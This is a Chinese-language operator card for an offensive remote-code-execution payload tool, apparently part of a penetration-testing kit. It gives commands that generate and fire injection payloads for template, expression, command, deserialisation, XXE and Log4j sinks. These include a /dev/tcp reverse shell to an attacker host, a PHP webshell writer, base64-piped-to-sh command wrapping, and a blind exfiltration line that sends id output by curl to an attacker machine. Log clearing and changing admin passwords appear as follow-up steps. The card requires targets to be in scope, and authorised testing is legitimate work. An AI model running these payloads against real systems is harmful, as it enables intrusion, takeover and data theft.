# 大爱仙尊 RCE 锻造手法

> 工具：`python3 炼蛊房/rce_forge.py`  
> 探测仍走：`tpl_inject_probe.py`（算术 / `se9359`）  
> 落马 / 回连：`payload_forge.py drive` · `se_listen.py`

目标须在 scope。本卡是 **确认 sink 之后一发打穿**，不是广谱扫。

---

## 1. 立刻跑

```bash
python3 炼蛊房/rce_forge.py --self-test
python3 炼蛊房/rce_forge.py --list
python3 炼蛊房/rce_forge.py pack --case <案> --cmd id
python3 炼蛊房/rce_forge.py pack --case <案> --lhost <攻击机> --lport 4444 --rev
python3 炼蛊房/rce_forge.py pack --case <案> --write-ops --key <口令>
python3 炼蛊房/rce_forge.py shoot --family ssti-jinja --url 'https://授权/?q=x' --param q --case <案>
```

产物：`案卷/rce/`（按族分目录 + `HOW_TO.md`）。`shoot` 出 `uid=` 才算 L3。

---

## 2. 四刀

1. **认 sink** — SSTI 算术 9359 / CMDI `se9359` / 表达式报错栈。没过闸不要射本卡  
2. **出载荷** — `pack` 一次 22 族。默认 `id`；`--rev` 烤进 `/dev/tcp`；`--write-ops` 写出 `se_ops.php`  
3. **连打** — `shoot --family` 按变体轮询，命中 `uid=` / `se-ops` 停  
4. **交接** — 有马用 `drive`；有回连先 `se_listen.py`。清日志仍先问

`campaign` 已把本卡打进 `案卷/payloads/rce/`。

---

## 3. 族

| 族 | sink |
|----|------|
| ssti-jinja / twig / freemarker / velocity / smarty / pebble / erb / ejs / nunjucks / thymeleaf | 模板 |
| el-spel / el-ognl / el-groovy | 表达式 |
| cmdi-unix / cmdi-win | 命令拼接 |
| php-eval / php-wrap | eval / data:// / expect:// |
| py-eval / node-eval | 动态代码 |
| deser-pickle | `pickle.loads` |
| xxe-expect | PHP expect 实体 |
| jndi | Log4j 回调，命令位填 `攻击机:端口` |

命令一律 `echo b64\|base64 -d\|sh` 包一层，避免引号把模板炸开。

---

## 4. 十形矩阵（认形再射）

```bash
python3 炼蛊房/rce_family_route.py --signal 抢rce
python3 炼蛊房/rce_family_route.py --list
```

| 输入面 | 形态 | 先探 | 再射 |
|--------|------|------|------|
| 参数/头/文件名 | 命令注入 | `tpl_inject_probe.py cmdi` | `shoot --family cmdi-unix` |
| 模板 | SSTI | `tpl_inject_probe.py ssti` | `ssti-jinja` / twig / … |
| XML/JSON/YAML | XXE / 反序列化 | `tpl_inject_probe.py xxe` | `xxe-expect` / `deser-pickle` |
| 上传 | 任意文件 | `upload_forge_probe.py` | 可执行 URL 出 uid= |
| 包含 | LFI | `tpl_inject_probe.py lfi` | `php-wrap` / 日志马 |
| SQL | OUTFILE / xp_cmdshell | `sqlmap_kit.py ladder` | 有 FILE/sa 再 RCE |
| SSRF | gopher / IMDS | `ssrf_probe.py` | Redis 写 cron 等 |
| 表达式 | SpEL/OGNL | 专卡 | `el-spel` |
| JNDI | Log4j | 专卡 | `jndi`（DNS 只算 primitive） |
| 弱口/后台 | 管理面上传 | `auth_brute_probe` | 回到上传形 |

无回显：`cmd && sleep 5` → `nslookup x.dnslog` → `curl http://攻击机/$(id|base64)`。

## 5. 证据不许跳级

| 级 | 含义 | 报告能不能写 GetShell |
|----|------|------------------------|
| hypothesis | 标题像 Jenkins | 否 |
| observed | footer 出版本 | 否 |
| primitive | 可控 DNS / 延时 | 否，只写出网原语 |
| local_proof | 同版本靶场 | 写靶场，不写生产已控 |
| remote_proof | 授权目标 `uid=` / 文件可执行 / 回连 | 是 |

**写文件成功 ≠ RCE。** 必须再访问执行。DNSlog ≠ GetShell。后台登录 ≠ shell。

```bash
python3 炼蛊房/rce_family_route.py grade --kind primitive --note 'dnslog only'
```

---

## 6. 纪律

1. 先指纹和默认口令，再高端 CVE。  
2. 一条链打到 RCE 才算价值；单个洞只记账。  
3. 一次改一个变量。打不通写「不可利用」。  
4. 清日志 / 改超管密仍先问。
